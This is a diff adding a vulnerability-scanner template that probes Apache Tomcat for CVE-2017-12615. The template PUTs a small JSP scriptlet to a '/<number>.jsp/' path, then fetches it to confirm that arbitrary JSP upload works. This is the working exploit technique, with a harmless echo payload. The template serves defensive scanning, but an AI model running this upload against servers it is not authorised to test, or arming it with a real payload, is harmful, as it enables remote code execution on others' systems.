@@ -1,0 +1,22 @@
+name: poc-tomcat-put-rce
+transport: http
+set:
+  r0: randomInt(1000, 9999)
+rules:
+  r0:
+    request:
+      method: PUT
+      path: "/{{r0}}.jsp/"
+      body: "<%out.println(\"{{r0}}\");%>"
+    expression: response.status == 200 || response.status == 201 || response.status == 204
+  r1:
+    request:
+      method: GET
+      path: "/{{r0}}.jsp"
+    expression: response.status == 200 && response.body.bcontains("{{r0}}")
+expression: r0() && r1()
+detail:
+  author: sxel
+  description: Apache Tomcat PUT method JSP upload RCE probe (CVE-2017-12615, read-write misconfig)
+  severity: critical
+  tags: tomcat,apache,rce,upload
